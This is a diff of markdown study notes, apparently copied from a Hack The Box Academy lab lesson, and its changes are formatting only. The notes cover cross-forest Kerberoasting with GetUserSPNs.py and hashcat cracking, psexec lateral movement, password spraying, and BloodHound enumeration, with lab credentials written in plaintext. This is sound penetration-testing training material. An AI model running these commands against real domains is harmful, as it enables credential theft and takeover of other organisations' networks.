@@ -1,19 +1,21 @@
 # Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux
 
----
-The scenario starts out with authenticating to DC01 with wley's password. Gather All the SPNs to crack to then authenticate across to the other domain. Cross-Forest Trust will allow SPN sapsso to authenticate to DC03:
-- Command looks like this: 
-	- psexec.py FREIGHTLOGISTICS.LOCAL/sapsso@academy-ea-dc03.inlanefreight.local - target-ip 172.16.5.238. 
-	- Find the DC03 IP by using the ping script
-	- FREIGHTLOGISTICS.LOCAL is where sapsso is, it's the target IP we were given. 
+***
 
-As we saw in the previous section, it is often possible to Kerberoast across a forest trust. If this is possible in the environment we are assessing, we can perform this with `GetUserSPNs.py` from our Linux attack host. To do this, we need credentials for a user that can authenticate into the other domain and specify the `-target-domain` flag in our command. Performing this against the `FREIGHTLOGISTICS.LOCAL` domain, we see one SPN entry for the `mssqlsvc` account.
+The scenario starts out with authenticating to DC01 with wley's password. Gather All the SPNs to crack to then authenticate across to the other domain. Cross-Forest Trust will allow SPN sapsso to authenticate to DC03:
+
+* Command looks like this:
+  * psexec.py FREIGHTLOGISTICS.LOCAL/sapsso@academy-ea-dc03.inlanefreight.local - target-ip 172.16.5.238.
+  * Find the DC03 IP by using the ping script
+  * FREIGHTLOGISTICS.LOCAL is where sapsso is, it's the target IP we were given.
+
+As we saw in the previous section, it is often possible to Kerberoast across a forest trust. If this is possible in the environment we are assessing, we can perform this with `GetUserSPNs.py` from our Linux attack host. To do this, we need credentials for a user that can authenticate into the other domain and specify the `-target-domain` flag in our command. Performing this against the `FREIGHTLOGISTICS.LOCAL` domain, we see one SPN entry for the `mssqlsvc` account.
 
 ## Cross-Forest Kerberoasting
 
 #### Using GetUserSPNs.py
 
-  Using GetUserSPNs.py
+&#x20; Using GetUserSPNs.py
 
 ```shell-session
 acd199218@htb[/htb]$ GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
@@ -26,11 +28,11 @@ ServicePrincipalName                 Name      MemberOf                         
 MSSQLsvc/sql01.freightlogstics:1433  mssqlsvc  CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL  2022-03-24 15:47:52.488917  <never> 
 ```
 
-Rerunning the command with the `-request` flag added gives us the TGS ticket. We could also add `-outputfile <OUTPUT FILE>` to output directly into a file that we could then turn around and run Hashcat against.
+Rerunning the command with the `-request` flag added gives us the TGS ticket. We could also add `-outputfile <OUTPUT FILE>` to output directly into a file that we could then turn around and run Hashcat against.
 
 #### Using the -request Flag
 
-  Using the -request Flag
+&#x20; Using the -request Flag
 
 ```shell-session
 acd199218@htb[/htb]$ GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley  
@@ -46,21 +48,21 @@ MSSQLsvc/sql01.freightlogstics:1433  mssqlsvc  CN=Domain Admins,CN=Users,DC=FREI
 $krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$FREIGHTLOGISTICS.LOCAL/mssqlsvc*$10<SNIP>
 ```
 
-We could then attempt to crack this offline using Hashcat with mode `13100`. If successful, we'd be able to authenticate into the `FREIGHTLOGISTICS.LOCAL` domain as a Domain Admin. If we are successful with this type of attack during a real-world assessment, it would also be worth checking to see if this account exists in our current domain and if it suffers from password re-use. This could be a quick win for us if we have not yet been able to escalate in our current domain. Even if we already have control over the current domain, it would be worth adding a finding to our report if we do find password re-use across similarly named accounts in different domains.
+We could then attempt to crack this offline using Hashcat with mode `13100`. If successful, we'd be able to authenticate into the `FREIGHTLOGISTICS.LOCAL` domain as a Domain Admin. If we are successful with this type of attack during a real-world assessment, it would also be worth checking to see if this account exists in our current domain and if it suffers from password re-use. This could be a quick win for us if we have not yet been able to escalate in our current domain. Even if we already have control over the current domain, it would be worth adding a finding to our report if we do find password re-use across similarly named accounts in different domains.
 
- Suppose we can Kerberoast across a trust and have run out of options in the current domain. In that case, it could also be worth attempting a single password spray with the cracked password, as there is a possibility that it could be used for other service accounts if the same admins are in charge of both domains. Here, we have yet another example of iterative testing and leaving no stone unturned.
+&#x20;Suppose we can Kerberoast across a trust and have run out of options in the current domain. In that case, it could also be worth attempting a single password spray with the cracked password, as there is a possibility that it could be used for other service accounts if the same admins are in charge of both domains. Here, we have yet another example of iterative testing and leaving no stone unturned.
 
----
+***
 
 ## Hunting Foreign Group Membership with Bloodhound-python
 
-As noted in the last section, we may, from time to time, see users or admins from one domain as members of a group in another domain. Since only `Domain Local Groups` allow users from outside their forest, it is not uncommon to see a highly privileged user from Domain A as a member of the built-in administrators group in domain B when dealing with a bidirectional forest trust relationship. If we are testing from a Linux host, we can gather this information by using the [Python implementation of BloodHound](https://github.com/fox-it/BloodHound.py). We can use this tool to collect data from multiple domains, ingest it into the GUI tool and search for these relationships.
+As noted in the last section, we may, from time to time, see users or admins from one domain as members of a group in another domain. Since only `Domain Local Groups` allow users from outside their forest, it is not uncommon to see a highly privileged user from Domain A as a member of the built-in administrators group in domain B when dealing with a bidirectional forest trust relationship. If we are testing from a Linux host, we can gather this information by using the [Python implementation of BloodHound](https://github.com/fox-it/BloodHound.py). We can use this tool to collect data from multiple domains, ingest it into the GUI tool and search for these relationships.
 
-On some assessments, our client may provision a VM for us that gets an IP from DHCP and is configured to use the internal domain's DNS. We will be on an attack host without DNS configured in other instances. In this case, we would need to edit our `resolv.conf` file to run this tool since it requires a DNS hostname for the target Domain Controller instead of an IP address. We can edit the file as follows using sudo rights. Here we have commented out the current nameserver entries and added the domain name and the IP address of `ACADEMY-EA-DC01` as the nameserver.
+On some assessments, our client may provision a VM for us that gets an IP from DHCP and is configured to use the internal domain's DNS. We will be on an attack host without DNS configured in other instances. In this case, we would need to edit our `resolv.conf` file to run this tool since it requires a DNS hostname for the target Domain Controller instead of an IP address. We can edit the file as follows using sudo rights. Here we have commented out the current nameserver entries and added the domain name and the IP address of `ACADEMY-EA-DC01` as the nameserver.
 
 #### Adding INLANEFREIGHT.LOCAL Information to /etc/resolv.conf
 
-  Adding INLANEFREIGHT.LOCAL Information to /etc/resolv.conf
+&#x20; Adding INLANEFREIGHT.LOCAL Information to /etc/resolv.conf
 
 ```shell-session
 acd199218@htb[/htb]$ cat /etc/resolv.conf 
@@ -80,7 +82,7 @@ Once this is in place, we can run the tool against the target domain as follows:
 
 #### Running bloodhound-python Against INLANEFREIGHT.LOCAL
 
-  Running bloodhound-python Against INLANEFREIGHT.LOCAL
+&#x20; Running bloodhound-python Against INLANEFREIGHT.LOCAL
 
 ```shell-session
 acd199218@htb[/htb]$ bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2
@@ -103,7 +105,7 @@ We can compress the resultant zip files to upload one single zip file directly i
 
 #### Compressing the File with zip -r
 
-  Compressing the File with zip -r
+&#x20; Compressing the File with zip -r
 
 ```shell-session
 acd199218@htb[/htb]$ zip -r ilfreight_bh.zip *.json
@@ -114,11 +116,11 @@ acd199218@htb[/htb]$ zip -r ilfreight_bh.zip *.json
   adding: 20220329140127_users.json (deflated 98%)
 ```
 
-We will repeat the same process, this time filling in the details for the `FREIGHTLOGISTICS.LOCAL` domain.
+We will repeat the same process, this time filling in the details for the `FREIGHTLOGISTICS.LOCAL` domain.
 
 #### Adding FREIGHTLOGISTICS.LOCAL Information to /etc/resolv.conf
 
-  Adding FREIGHTLOGISTICS.LOCAL Information to /etc/resolv.conf
+&#x20; Adding FREIGHTLOGISTICS.LOCAL Information to /etc/resolv.conf
 
 ```shell-session
 acd199218@htb[/htb]$ cat /etc/resolv.conf 
@@ -134,11 +136,11 @@ domain FREIGHTLOGISTICS.LOCAL
 nameserver 172.16.5.238
 ```
 
-The `bloodhound-python` command will look similar to the previous one:
+The `bloodhound-python` command will look similar to the previous one:
 
 #### Running bloodhound-python Against FREIGHTLOGISTICS.LOCAL
 
-  Running bloodhound-python Against FREIGHTLOGISTICS.LOCAL
+&#x20; Running bloodhound-python Against FREIGHTLOGISTICS.LOCAL
 
 ```shell-session
 acd199218@htb[/htb]$ bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2
@@ -156,13 +158,13 @@ INFO: Found 1 trusts
 INFO: Starting computer enumeration with 10 workers
 ```
 
-After uploading the second set of data (either each JSON file or as one zip file), we can click on `Users with Foreign Domain Group Membership` under the `Analysis` tab and select the source domain as `INLANEFREIGHT.LOCAL`. Here, we will see the built-in Administrator account for the INLANEFREIGHT.LOCAL domain is a member of the built-in Administrators group in the FREIGHTLOGISTICS.LOCAL domain as we saw previously.
+After uploading the second set of data (either each JSON file or as one zip file), we can click on `Users with Foreign Domain Group Membership` under the `Analysis` tab and select the source domain as `INLANEFREIGHT.LOCAL`. Here, we will see the built-in Administrator account for the INLANEFREIGHT.LOCAL domain is a member of the built-in Administrators group in the FREIGHTLOGISTICS.LOCAL domain as we saw previously.
 
 #### Viewing Dangerous Rights through BloodHound
 
-![image](https://academy.hackthebox.com/storage/modules/143/foreign_membership.png)
+![image](https://academy.hackthebox.com/storage/modules/143/foreign\_membership.png)
 
----
+***
 
 ## Closing Thoughts on Trusts
 
